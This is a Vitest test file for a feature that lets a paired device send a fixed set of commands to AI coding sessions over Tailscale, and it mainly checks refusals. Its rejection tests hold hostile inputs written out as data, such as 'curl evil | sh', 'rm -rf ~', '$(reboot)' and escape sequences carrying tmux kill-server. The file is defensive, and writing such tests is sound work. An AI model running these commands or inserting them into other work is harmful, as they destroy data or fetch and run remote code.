// Commands from a paired deck for this deck's sessions (lan-control.mjs,
// lan-control-local.mjs, the `control` frame in lan-serve.mjs and
// controlPeer in lan-engine.mjs). A remote-command path, so what is pinned
// here is mostly what it refuses: an unpaired deck, an address that is not one
// of the owner's tailnet machines, the switch off or vetoed, a command outside
// the fixed set or carrying more than its fields, a session the deck did not
// start, and too many commands. And that every one is logged where it lands.
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
// @ts-expect-error — plain .mjs server module, no types
import { DEFAULTS, lanControlVetoed, normalise, pagePatch } from "../../server/deck-prefs.mjs";
// @ts-expect-error — plain .mjs server module, no types
import { lanApplyFields } from "../../server/lan-deck.mjs";
// @ts-expect-error — plain .mjs server module, no types
import { ACTIONS, checkCommand, createControlLog, createRateLimit, keyFrames, MAX_PROMPT, RATE, STOP_GAP_MS, stateRefuses } from "../../server/lan-control.mjs";
// @ts-expect-error — plain .mjs server module, no types
import { createLocalControl } from "../../server/lan-control-local.mjs";
// @ts-expect-error — plain .mjs server module, no types
import { createServe } from "../../server/lan-serve.mjs";
// @ts-expect-error — plain .mjs server module, no types
import { summarizeSessions } from "../../server/session-summary.mjs";
// @ts-expect-error — plain .mjs server module, no types
import { SETTING_VARS } from "../../server/login-service.mjs";
// @ts-expect-error — plain .mjs server module, no types
import { GUARDED_READS } from "../../server/request-gates.mjs";
import { readFileSync } from "node:fs";
import { announce, rigDeck, stopAll } from "./lan-engine-rig";

afterEach(stopAll);

const SID = "5d1c0f6e-2b3a-4c5d-9e8f-000000000001";

/** A ring with one session waiting on a permission prompt and one working. */
function ring(t: number) {
  let seq = 0;
  const env = (dt: number, payload: Record<string, unknown>) => ({ seq: ++seq, receivedAt: t + dt, payload });
  return [
    env(0, { hook_event_name: "SessionStart", session_id: SID, cwd: "/w/api" }),
    env(1, { hook_event_name: "UserPromptSubmit", session_id: SID, cwd: "/w/api", prompt: "go" }),
    env(2, { hook_event_name: "Notification", session_id: SID, notification_type: "permission_prompt", message: "May I?" }),
    env(3, { hook_event_name: "UserPromptSubmit", session_id: "s-work", cwd: "/w/web", prompt: "go" }),
  ];
}

describe("the switch", () => {
  it("is off by default, only a real true turns it on, and the machine can hold it off", () => {
    expect(DEFAULTS.lan.acceptControl).toBe(false);
    expect(normalise({}).lan.acceptControl).toBe(false);
    expect(normalise({ lan: { acceptControl: "yes" } }).lan.acceptControl).toBe(false);
    expect(normalise({ lan: { acceptControl: true } }).lan.acceptControl).toBe(true);
    expect(pagePatch({ lan: { acceptControl: true } })).toEqual({ lan: { acceptControl: true } });
    expect(lanControlVetoed({ AGENTS_DECK_NO_LAN_CONTROL: "1" })).toBe(true);
    expect(lanApplyFields({ lan: { acceptControl: true } }, { env: { AGENTS_DECK_NO_LAN_CONTROL: "1" } })).toMatchObject({ acceptControl: true, controlVetoed: true });
    expect(lanApplyFields({}, { env: {} })).toMatchObject({ acceptControl: false, controlVetoed: false });
  });

  it("travels with the login item, the desktop shell and the README, and its log is a guarded read", () => {
    expect(SETTING_VARS).toContain("AGENTS_DECK_NO_LAN_CONTROL");
    expect(readFileSync(new URL("../../../desktop/deck-host.mjs", import.meta.url), "utf8")).toContain('"AGENTS_DECK_NO_LAN_CONTROL"');
    expect(readFileSync(new URL("../../../README.md", import.meta.url), "utf8")).toContain("| `AGENTS_DECK_NO_LAN_CONTROL=1` |");
    expect(GUARDED_READS.has("/api/lan/control-log")).toBe(true);
  });
});

describe("a command", () => {
  it("is one of a fixed set, rebuilt field by field", () => {
    expect(ACTIONS).toEqual(["prompt", "allow", "deny", "answer", "interrupt", "stop", "start"]);
    expect(checkCommand({ action: "prompt", sid: SID, text: "hello", cmd: "rm -rf /", shell: true }))
      .toEqual({ ok: true, command: { action: "prompt", sid: SID, text: "hello" } });
    expect(checkCommand({ action: "allow", sid: SID, text: "ignored" })).toEqual({ ok: true, command: { action: "allow", sid: SID } });
    expect(checkCommand({ action: "answer", sid: SID, choice: 2 })).toEqual({ ok: true, command: { action: "answer", sid: SID, choice: 2 } });
  });

  it("refuses anything else: a verb outside the set, a session id that is not one, a bad choice, an empty or huge prompt", () => {
    for (const bad of [
      null, "prompt", [], { action: "exec", sid: SID }, { action: "kill-server", sid: SID }, { action: "prompt" },
      { action: "prompt", sid: "x; rm -rf /" }, { action: "prompt", sid: "-t%1" }, { action: "prompt", sid: SID },
      { action: "prompt", sid: SID, text: "  \n " }, { action: "prompt", sid: SID, text: "x".repeat(MAX_PROMPT + 1) },
      { action: "answer", sid: SID, choice: 0 }, { action: "answer", sid: SID, choice: 99 }, { action: "answer", sid: SID, choice: "1" },
    ]) expect(checkCommand(bad).ok, JSON.stringify(bad)).toBe(false);
  });

  it("keeps a prompt's newlines and drops every byte that would be a key", () => {
    const { command } = checkCommand({ action: "prompt", sid: SID, text: "line one\r\nline two\u001b[201~\u0003\u001b:kill-server\u0007" });
    expect(command.text).toBe("line one\nline two[201~:kill-server");
    expect(command.text).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f]/);
  });

  it("is typed as the Command Panel's socket types: the prompt as its paste, then Enter; the rest as Claude Code's keys", () => {
    const text = "-t %0 kill-server; $(whoami)\nsecond line";
    expect(keyFrames({ action: "prompt", sid: SID, text })).toEqual([
      { type: "text", data: JSON.stringify({ t: "paste", text }) },
      { type: "binary", data: "\r" },
    ]);
    expect(keyFrames({ action: "allow", sid: SID })).toEqual([{ type: "binary", data: "1" }]);
    expect(keyFrames({ action: "deny", sid: SID })).toEqual([{ type: "binary", data: "\u001b" }]);
    expect(keyFrames({ action: "answer", sid: SID, choice: 3 })).toEqual([{ type: "binary", data: "3" }]);
    expect(keyFrames({ action: "interrupt", sid: SID })).toEqual([{ type: "binary", data: "\u001b" }]);
    expect(keyFrames({ action: "stop", sid: SID })).toEqual([{ type: "binary", data: "\u0003" }, { wait: STOP_GAP_MS }, { type: "binary", data: "\u0003" }]);
  });

  it("answers a permission only while one waits, a question only while one is asked, a prompt only while neither", () => {
    const rows = summarizeSessions(ring(Date.now() - 1_000));
    const waiting = rows.find((r: { id: string }) => r.id === SID);
    const working = rows.find((r: { id: string }) => r.id === "s-work");
    expect(stateRefuses({ action: "allow", sid: SID }, waiting)).toBeNull();
    expect(stateRefuses({ action: "prompt", sid: SID, text: "x" }, waiting)).toBe("answer its prompt first");
    expect(stateRefuses({ action: "allow", sid: "s-work" }, working)).toBe("not waiting on a permission");
    expect(stateRefuses({ action: "answer", sid: "s-work", choice: 1 }, working)).toBe("not asking a question");
    expect(stateRefuses({ action: "prompt", sid: "s-work", text: "x" }, working)).toBeNull();
    expect(stateRefuses({ action: "interrupt", sid: "nope" }, undefined)).toBe("no such session");
  });
});

describe("carrying it out here", () => {
  const HANDLE = "a".repeat(64);
  function local(kind: string, { enabled = true, handle = HANDLE }: { enabled?: boolean; handle?: string } = {}) {
    const asked: string[] = [];
    const typed: Array<{ handle: string; frames: unknown[] }> = [];
    const engine = {
      enabled,
      route: async (method: string, body: { sessionId: string }) => {
        asked.push(`${method}:${body.sessionId}`);
        if (method === "target") return { status: 200, body: { ok: true, target: { kind } } };
        if (method === "open") return { status: 200, body: { ok: true, ticket: null }, handle };
        return { status: 404, body: {} };
      },
      type: async (h: string, frames: unknown[]) => { typed.push({ handle: h, frames }); return { ok: true }; },
    };
    const run = createLocalControl({ rows: () => summarizeSessions(ring(Date.now() - 1_000)), engine: async () => engine });
    return { run, asked, typed };
  }

  it("types into the session's pane of the deck's own tmux, through the Command Panel's engine", async () => {
    const { run, asked, typed } = local("A");
    expect(await run({ action: "allow", sid: SID })).toEqual({ ok: true });
    expect(asked).toEqual([`target:${SID}`, `open:${SID}`]);
    expect(typed).toEqual([{ handle: HANDLE, frames: [{ type: "binary", data: "1" }] }]);
  });

  it("refuses a session in someone's own tmux, a terminal, a service such as Remote Control, or a background job", async () => {
    for (const kind of ["B", "C", "D", "gone"]) {
      const { run, typed } = local(kind);
      expect(await run({ action: "allow", sid: SID })).toEqual({ ok: false, why: "not_deck_pane" });
      expect(typed).toEqual([]);
    }
  });

  it("refuses with no Command Panel, or a handle that is not one", async () => {
    expect(await local("A", { enabled: false }).run({ action: "allow", sid: SID })).toEqual({ ok: false, why: "no command panel" });
    const bad = local("A", { handle: "../../etc" });
    expect(await bad.run({ action: "allow", sid: SID })).toEqual({ ok: false, why: "not_deck_pane" });
    expect(bad.typed).toEqual([]);
    const none = createLocalControl({ rows: () => summarizeSessions(ring(Date.now() - 1_000)), engine: async () => null });
    expect(await none({ action: "allow", sid: SID })).toEqual({ ok: false, why: "no command panel" });
  });

  it("refuses by the session's state before the engine is asked anything", async () => {
    const { run, asked } = local("A");
    expect(await run({ action: "allow", sid: "s-work" })).toEqual({ ok: false, why: "not waiting on a permission" });
    expect(await run({ action: "stop", sid: "gone-session" })).toEqual({ ok: false, why: "no such session" });
    expect(asked).toEqual([]);
  });
});

describe("the frame, at the deck that runs it", () => {
  const PEER = "fp-mac";
  function rig(cfg: Record<string, unknown> = {}, { from = () => true } = {}) {
    const ran: unknown[] = [];
    const log = createControlLog();
    const st = { cfg: { enabled: true, trusted: [{ fp: PEER, name: "Mac" }], acceptControl: true, ...cfg } };
    const { serve } = createServe({
      settings: () => st.cfg, serverNow: () => ({}), myFp: () => "fp-pad",
      inbound: { spoke() {} }, learnCaller() {}, keepManifest() {}, manifestFrame: () => ({}),
      localAccounts: async () => [], liveLogin: null, exportAccount: async () => null, onError() {},
      localControl: async (c: unknown) => { ran.push(c); return { ok: true }; },
      controlFrom: from, controlLimit: createRateLimit(), controlLog: log,
    });
    const ask = async (command: unknown, peerFp = PEER, peerAddr = "100.86.23.45") => {
      let got: Record<string, unknown> | null = null;
      await serve({ t: "control", command }, { peerFp, peerAddr, peerName: "?", key: "k", send: (f: Record<string, unknown>) => { got = f; } });
      return got;
    };
    return { ask, ran, log, st };
  }

  it("runs a command from a paired deck on a tailnet address, and logs it without the prompt's words", async () => {
    const { ask, ran, log } = rig();
    expect(await ask({ action: "prompt", sid: SID, text: "secret plan", extra: "dropped" })).toEqual({ t: "control", ok: true });
    expect(ran).toEqual([{ action: "prompt", sid: SID, text: "secret plan" }]);
    expect(log.list()).toEqual([expect.objectContaining({ from: "Mac", fp: PEER, addr: "100.86.23.45", action: "prompt", sid: SID, chars: 11, ok: true })]);
    expect(JSON.stringify(log.list())).not.toContain("secret plan");
  });

  it("refuses, and logs, a deck that was never paired", async () => {
    const { ask, ran } = rig();
    expect(await ask({ action: "stop", sid: SID }, "fp-stranger")).toEqual({ t: "no", why: "not paired" });
    expect(ran).toEqual([]);
  });

  it("refuses, and logs, while the switch is off or the machine vetoed it", async () => {
    for (const cfg of [{ acceptControl: false }, { controlVetoed: true }, { enabled: false }]) {
      const { ask, ran, log } = rig(cfg);
      const r = await ask({ action: "interrupt", sid: SID });
      expect(r?.ok ?? false).toBe(false);
      expect(ran).toEqual([]);
      if (cfg.enabled !== false) expect(log.list().at(-1)).toMatchObject({ ok: false, why: "not accepted" });
    }
  });

  it("refuses an address that is not one of the owner's tailnet machines", async () => {
    const { ask, ran } = rig({}, { from: (a: string) => a.startsWith("100.") });
    expect(await ask({ action: "interrupt", sid: SID }, PEER, "192.168.1.119")).toEqual({ t: "control", ok: false, why: "not accepted" });
    expect(ran).toEqual([]);
  });

  it("refuses a malicious payload whole, and never runs any part of it", async () => {
    const { ask, ran, log } = rig();
    for (const command of [
      { action: "exec", sid: SID, cmd: "curl evil | sh" },
      { action: "prompt", sid: "$(reboot)", text: "x" },
      { action: "answer", sid: SID, choice: "1; rm -rf ~" },
      "prompt rm -rf /",
      { action: "prompt", sid: SID, text: "x".repeat(MAX_PROMPT + 10) },
    ]) {
      expect((await ask(command))?.ok).toBe(false);
    }
    expect(ran).toEqual([]);
    expect(log.list().every((e: { ok: boolean }) => !e.ok)).toBe(true);
  });

  it("holds each deck to its rate", async () => {
    const { ask, ran } = rig();
    const answers = [];
    for (let i = 0; i < RATE.burst + 1; i++) answers.push(await ask({ action: "interrupt", sid: SID }));
    expect(answers.at(-1)).toEqual({ t: "control", ok: false, why: "too many" });
    expect(ran).toHaveLength(RATE.burst);
  });
});

describe("two decks on loopback", () => {
  const SHIPPED = { autoAsk: true, autoAccept: true, pairingMode: "automatic", shareSessions: true };

  async function pair({ pad = {}, padDeps = {} }: { pad?: Record<string, unknown>; padDeps?: Record<string, unknown> } = {}) {
    const t = Date.now() - 60_000;
    const ran: unknown[] = [];
    const logged: Array<Record<string, unknown>> = [];
    const a = await rigDeck("Thinkpad", {
      settings: { ...SHIPPED, acceptControl: true, ...pad },
      deps: {
        sessions: () => summarizeSessions(ring(t), { now: t + 10 }),
        control: async (c: unknown) => { ran.push(c); return { ok: true }; },
        onControl: (e: Record<string, unknown>) => logged.push(e),
        // Loopback stands in for the tailnet here; the default rule is pinned below.
        controlFrom: (addr: string) => addr.replace(/^::ffff:/, "") === "127.0.0.1",
        ...padDeps,
      },
    });
    const b = await rigDeck("Mac", { settings: SHIPPED, deps: { sessions: () => [] } });
    announce(a, { fp: b.id.fp, port: b.port, name: "Mac" });
    announce(b, { fp: a.id.fp, port: a.port, name: "Thinkpad" });
    for (let i = 0; i < 3; i++) { await a.e.round(); await b.e.round(); }
    return { a, b, ran, logged };
  }

  it("send a command from one deck to the other's session, and log it there", async () => {
    const { a, b, ran, logged } = await pair();
    expect(b.e.remoteSessions()[0]).toMatchObject({ fp: a.id.fp, control: true });
    expect(await b.e.controlPeer(a.id.fp, { action: "allow", sid: SID })).toEqual({ ok: true });
    expect(ran).toEqual([{ action: "allow", sid: SID }]);
    expect(logged.at(-1)).toMatchObject({ action: "allow", sid: SID, ok: true, from: "Mac" });
    expect(a.e.controlLog()).toHaveLength(1);
  }, 30_000);

  it("are refused while the deck has the switch off, and the other deck is not offered control", async () => {
    const { a, b, ran } = await pair({ pad: { acceptControl: false } });
    expect(b.e.remoteSessions()[0]).toMatchObject({ control: false });
    expect(await b.e.controlPeer(a.id.fp, { action: "stop", sid: SID })).toEqual({ ok: false, why: "not accepted" });
    expect(ran).toEqual([]);
  }, 30_000);

  it("are refused when the machine vetoed it", async () => {
    const { a, b, ran } = await pair({ pad: { controlVetoed: true } });
    expect(await b.e.controlPeer(a.id.fp, { action: "stop", sid: SID })).toEqual({ ok: false, why: "not accepted" });
    expect(ran).toEqual([]);
  }, 30_000);

  it("are refused from an address Tailscale does not place as the owner's: loopback, by the default rule", async () => {
    const { a, b, ran } = await pair({ padDeps: { controlFrom: undefined } });
    expect(await b.e.controlPeer(a.id.fp, { action: "interrupt", sid: SID })).toEqual({ ok: false, why: "not accepted" });
    expect(ran).toEqual([]);
  }, 30_000);

  it("are refused once the decks are unpaired, and never sent for a command that is not one", async () => {
    const { a, b, ran } = await pair();
    expect(await b.e.controlPeer(a.id.fp, { action: "exec", sid: SID })).toEqual({ ok: false, why: "unknown action" });
    expect(a.e.unpair(b.id.fp)).toBe(true);
    expect((await b.e.controlPeer(a.id.fp, { action: "interrupt", sid: SID })).ok).toBe(false);
    expect(b.e.unpair(a.id.fp)).toBe(true);
    expect(await b.e.controlPeer(a.id.fp, { action: "interrupt", sid: SID })).toEqual({ ok: false, why: "not paired" });
    expect(ran).toEqual([]);
  }, 30_000);
});

describe("on the asking deck's page", () => {
  beforeAll(() => { vi.stubGlobal("document", { body: null }); });
  afterAll(() => { vi.unstubAllGlobals(); });

  const machine = (control: boolean) => ({
    fp: "fp-pad", name: "hagai-thinkpad", via: "tailscale" as const, at: 1, control,
    sessions: [
      { id: "s1", name: "Fix the build", project: "api", provider: "claude", state: "waiting" as const, waiting: "permission" as const, since: 1, lastEventAt: 1 },
      { id: "s2", name: "Pick one", project: "web", provider: "claude", state: "waiting" as const, waiting: "asked" as const, since: 1, lastEventAt: 1 },
      { id: "s3", name: "Working", project: "x", provider: "claude", state: "working" as const, waiting: null, since: 1, lastEventAt: 1 },
    ],
  });

  it("offers commands only for a machine that takes them, and what each session's state allows", async () => {
    const { default: RemoteSessionRows } = await import("../components/RemoteSessionRows");
    const off = renderToStaticMarkup(createElement(RemoteSessionRows, { machines: [machine(false)], now: 10 }));
    expect(off).not.toContain("<button");
    expect(off).not.toContain("<input");
    const on = renderToStaticMarkup(createElement(RemoteSessionRows, { machines: [machine(true)], now: 10 }));
    const strip = (id: string) => on.slice(on.indexOf(`data-remote-control="${id}"`), on.indexOf("</li>", on.indexOf(`data-remote-control="${id}"`)));
    expect(strip("s1")).toContain(">Allow<");
    expect(strip("s1")).toContain(">Deny<");
    expect(strip("s1")).not.toContain("<input");
    expect(strip("s2")).toContain('aria-label="Option 3"');
    expect(strip("s3")).toContain("<input");
    expect(strip("s3")).toContain(">Interrupt<");
    for (const id of ["s1", "s2", "s3"]) expect(strip(id)).toContain(">Stop<");
  });

  it("posts only the command's fields, and asks twice before allow and stop", async () => {
    const { CONFIRMED, sendControl } = await import("../components/RemoteSessionControl");
    expect([...CONFIRMED].sort()).toEqual(["allow", "stop"]);
    let sent: { url: string; body: unknown } | null = null;
    const fake = (async (url: string, init: { body: string }) => { sent = { url, body: JSON.parse(init.body) }; return new Response(JSON.stringify({ ok: false, why: "not accepted" })); }) as unknown as typeof fetch;
    expect(await sendControl("fp-pad", "s3", "prompt", { text: "hi" }, fake)).toEqual({ ok: false, why: "not accepted" });
    expect(sent).toEqual({ url: "/api/lan/control", body: { fp: "fp-pad", sid: "s3", action: "prompt", text: "hi" } });
  });
});
